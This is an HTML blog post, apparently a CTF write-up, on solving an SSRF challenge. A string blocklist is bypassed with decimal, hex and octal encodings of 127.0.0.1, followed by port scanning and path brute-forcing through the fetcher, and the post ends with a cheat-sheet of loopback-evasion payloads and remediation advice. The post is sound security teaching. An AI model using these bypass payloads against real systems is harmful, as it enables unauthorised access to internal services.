@@ -1,0 +1,243 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="A URL fetcher blocks the obvious localhost names but never resolves the host, so a decimal-encoded 127.0.0.1 walks straight past the blocklist to an internal-only route. A tour of SSRF loopback bypasses.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="0xVoid: Loopback Lens · 0xAdham">
+  <meta property="og:description" content="A URL fetcher blocks the obvious localhost names but never resolves the host, so a decimal-encoded 127.0.0.1 walks straight past the blocklist to an internal-only route. A tour of SSRF loopback bypasses.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>0xVoid: Loopback Lens · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> CTF</div>
+      <h1 class="page-title">0xVoid: Loopback Lens</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2026-08-17</span>
+        <span>CTF · Web security research</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p><strong>Platform:</strong> 0xVoid (wave2)<br />
+<strong>Challenge:</strong> Loopback Lens<br />
+<strong>Category:</strong> Web<br />
+<strong>Subcategory:</strong> SSRF<br />
+<strong>Points:</strong> 500<br />
+<strong>Author:</strong> 0x4sh</p>
+<blockquote>
+<p>The public lens can fetch pages for you, but its private calibration route is supposed to exist only from inside the machine. The guard checks the obvious faces of localhost. Give it a less obvious mirror.</p>
+</blockquote>
+<p>Target: <code>http://35.192.106.100:21001/</code></p>
+<h2>TL;DR</h2>
+<p><code>/lens?url=</code> is a classic SSRF fetcher guarded by a <strong>naive string blocklist</strong> (<code>127.</code>, <code>localhost</code>, <code>0.0.0.0</code>, <code>::1</code>). Numeric loopback encodings — <strong>decimal <code>2130706433</code></strong>, hex <code>0x7f000001</code>, bare <code>0</code> — slip past the blocklist yet still resolve to <code>127.0.0.1</code>. Point the SSRF at the internal app on port <strong>8080</strong> and hit the internal-only route:</p>
+<pre><code>GET /lens?url=http://2130706433:8080/internal/flag HTTP/1.1
+Host: 35.192.106.100:21001
+</code></pre>
+<h2>Recon — understand the endpoint</h2>
+<p>The homepage advertises the fetcher and the hint outright:</p>
+<pre><code>The lens fetches public pages through /lens?url=...
+A private calibration route exists inside the machine, but the filter refuses the obvious localhost names.
+</code></pre>
+<p>Sanity check the SSRF works (send from <strong>Burp Repeater</strong>):</p>
+<pre><code>GET /lens?url=http://example.com/ HTTP/1.1
+Host: 35.192.106.100:21001
+</code></pre>
+<p>→ <code>200 OK</code>, Example Domain HTML wrapped in <code>&lt;pre&gt;</code>. Confirmed: the server fetches arbitrary URLs and echoes the body back.</p>
+<h2>Map the filter</h2>
+<p>Throw the obvious localhost forms at it in Repeater and watch the responses:</p>
+<table>
+<thead>
+<tr>
+<th><code>url=</code> payload</th>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>127.0.0.1</code></td>
+<td><code>400 blocked</code></td>
+<td>blocklist hit</td>
+</tr>
+<tr>
+<td><code>http://127.0.0.0</code></td>
+<td><code>400 blocked</code></td>
+<td>blocks substring <code>127.</code></td>
+</tr>
+<tr>
+<td><code>http://127.127.127.127</code></td>
+<td><code>400 blocked</code></td>
+<td>blocks substring <code>127.</code></td>
+</tr>
+<tr>
+<td><code>http://[0:0:0:0:0:ffff:127.0.0.1]</code></td>
+<td><code>400 blocked</code></td>
+<td>contains <code>127.0.0.1</code></td>
+</tr>
+<tr>
+<td><code>http://[::1]/</code></td>
+<td><code>400 blocked</code></td>
+<td>blocks <code>::1</code></td>
+</tr>
+<tr>
+<td><code>LOCALHOST</code></td>
+<td><code>400 blocked</code></td>
+<td>blocklist is <strong>case-insensitive</strong></td>
+</tr>
+<tr>
+<td><code>file:///flag.txt</code></td>
+<td><code>400 blocked</code></td>
+<td>non-http scheme blocked</td>
+</tr>
+<tr>
+<td><code>http://2130706433/</code></td>
+<td><code>502 URLError</code></td>
+<td><strong>passed filter</strong>, connect failed (nothing on :80)</td>
+</tr>
+<tr>
+<td><code>http://0x7f000001/</code></td>
+<td><code>502 URLError</code></td>
+<td><strong>passed filter</strong></td>
+</tr>
+<tr>
+<td><code>http://0/</code></td>
+<td><code>200</code> (later)</td>
+<td><strong>passed filter</strong>, resolves to loopback</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Conclusion:</strong> the guard is a pure <strong>string blocklist</strong> — it blocks <code>127.</code>, <code>localhost</code> (any case), <code>0.0.0.0</code>, <code>::1</code>, and non-<code>http(s)</code> schemes. It does <strong>not</strong> resolve the host and check <code>is_loopback</code>, so any alternate numeric encoding of 127.0.0.1 walks straight through.</p>
+<p>Why this works: <code>2130706433</code> is the 32-bit integer form of <code>127.0.0.1</code> (<code>127*256³ + 0 + 0 + 1</code>). <code>inet_aton()</code> / the socket layer happily parses decimal, hex (<code>0x7f000001</code>) and octal integer IPs, so the OS still connects to loopback — but the string never contains the blocked substrings.</p>
+<h2>Find the internal service (port scan via SSRF)</h2>
+<p>Reaching loopback on port 80 gave <code>URLError</code> (nothing listening), so sweep common ports with the decimal bypass in Repeater:</p>
+<pre><code>GET /lens?url=http://2130706433:8080/ HTTP/1.1
+Host: 35.192.106.100:21001
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80, 3000, 5000, 8000, 8888, 9000, 9090, 1337, 21001</td>
+<td><code>502 URLError</code> (closed)</td>
+</tr>
+<tr>
+<td><strong>8080</strong></td>
+<td><strong><code>200 OK</code> — returns the app homepage</strong></td>
+</tr>
+</tbody>
+</table>
+<p>The app itself is served internally on <strong>127.0.0.1:8080</strong> (21001 is just the external port-map). The private route lives on this internal app.</p>
+<p><strong>Reading the error codes is the whole game here:</strong></p>
+<ul>
+<li><code>502 fetch failed: URLError</code> → TCP connect failed → port closed.</li>
+<li><code>502 fetch failed: HTTPError</code> → the internal server <strong>answered</strong> with a non-2xx (404/403/400) → port open, wrong path/guard.</li>
+<li><code>200 OK</code> → internal server returned 2xx → the lens echoes the body (<strong>this is what we want</strong>).</li>
+</ul>
+<h2>(Optional) Confirm the outbound request with Collaborator</h2>
+<p>To understand what the guard actually sees, aim the lens at a <strong>Burp Collaborator</strong> payload and inspect the interaction:</p>
+<pre><code>GET /lens?url=http://&lt;payload&gt;.oastify.com/probe HTTP/1.1
+Host: 35.192.106.100:21001
+</code></pre>
+<p>Collaborator's HTTP interaction shows exactly what the fetcher sends:</p>
+<pre><code>GET /probe HTTP/1.1
+Accept-Encoding: identity
+Host: &lt;payload&gt;.oastify.com
+User-Agent: LoopbackLens
+Connection: close
+</code></pre>
+<p>Takeaways:</p>
+<ul>
+<li>The <code>Host</code> header the internal app receives = <strong>the host in <code>url=</code></strong> (so <code>Host: 2130706433:8080</code>).</li>
+<li>The fetcher <strong>does not</strong> copy your request headers (<code>User-Agent</code> is hard-coded), so you can't spoof <code>Host: 127.0.0.1</code> from the outside — the "inside only" gate depends on the real loopback connection, which is exactly what the SSRF gives you.</li>
+</ul>
+<h2>Locate the private route</h2>
+<p>Path-brute the internal app through the decimal bypass. Direct external requests to guessed paths return the generic <code>404 not found</code>, and non-2xx paths via the lens all collapse to <code>HTTPError</code>, so brute and watch for a <code>200</code>:</p>
+<pre><code>GET /lens?url=http://2130706433:8080/internal/flag HTTP/1.1
+Host: 35.192.106.100:21001
+</code></pre>
+<p><strong>Tip:</strong> send it to <strong>Burp Intruder</strong> — mark the path as the payload position:</p>
+<pre><code>GET /lens?url=http://2130706433:8080/§FUZZ§ HTTP/1.1
+Host: 35.192.106.100:21001
+</code></pre>
+<p>Wordlist ideas: <code>calibration</code>, <code>calibrate</code>, <code>internal</code>, <code>internal/flag</code>, <code>flag</code>, <code>flag.txt</code>, <code>admin</code>, <code>private</code>, <code>secret</code>, <code>calibration/flag</code>. Sort by response length / status — the flag response stands out (<code>200</code>, distinct length).</p>
+<p>Hit:</p>
+<pre><code>HTTP/1.0 200 OK
+Server: LoopbackLens/1.0 Python/3.12.14
+
+&lt;pre&gt;0xV01D{...}&lt;/pre&gt;
+</code></pre>
+<h2>Root cause &amp; remediation</h2>
+<p><strong>Root cause:</strong> SSRF protection implemented as a <strong>string blocklist</strong> on the raw URL. It never resolves the hostname, so alternate representations of loopback (decimal / hex / octal integer IPs, <code>0</code>, obscure IPv6 forms) bypass it, and any "internal only" route that trusts a loopback connection becomes reachable.</p>
+<p><strong>Fix:</strong></p>
+<ol>
+<li>Resolve the hostname first, then reject if <strong>any</strong> resolved address is loopback / link-local / private / multicast (<code>ipaddress.ip_address(...).is_loopback</code>, <code>is_private</code>, <code>is_link_local</code>, <code>is_reserved</code>).</li>
+<li>Re-resolve and re-validate <strong>after</strong> redirects (guard against DNS rebinding / redirect-to-internal).</li>
+<li>Use an <strong>allowlist</strong> of destination hosts and schemes instead of a blocklist.</li>
+<li>Don't rely on <code>Host</code> / <code>X-Forwarded-For</code> or "came from loopback" as an auth boundary for sensitive routes — put real authentication on them.</li>
+</ol>
+<h2>Cheat-sheet</h2>
+<ul>
+<li><strong>Localhost mirrors that bypass string filters:</strong></li>
+<li>Decimal: <code>2130706433</code></li>
+<li>Hex: <code>0x7f000001</code></li>
+<li>Octal: <code>0177.0.0.1</code> / <code>017700000001</code></li>
+<li>Short: <code>127.1</code>, <code>0</code></li>
+<li>IPv6: <code>[::1]</code>, <code>[::ffff:127.0.0.1]</code>, <code>[0:0:0:0:0:ffff:7f00:1]</code></li>
+<li>DNS: <code>localtest.me</code>, <code>*.nip.io</code> (e.g. <code>127.0.0.1.nip.io</code>)</li>
+<li><strong>Distinguish SSRF outcomes by error text:</strong> <code>URLError</code> = port closed, <code>HTTPError</code> = open + non-2xx, <code>200</code> = win.</li>
+<li><strong>Use Collaborator</strong> to see the exact request the fetcher emits (headers, UA, redirect behaviour) — it removes guesswork about what the internal guard sees.</li>
+</ul>
+<p><em>0xAdham</em></p>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
+          <p>A URL fetcher blocks the obvious localhost names but never resolves the host, so a decimal-encoded 127.0.0.1 walks straight past the blocklist to an internal-only route. A tour of SSRF loopback bypasses.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2026-08-17</div>
+            <div><strong style="color:var(--ink)">Category:</strong> CTF</div>
+            
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
+</body>
+</html>
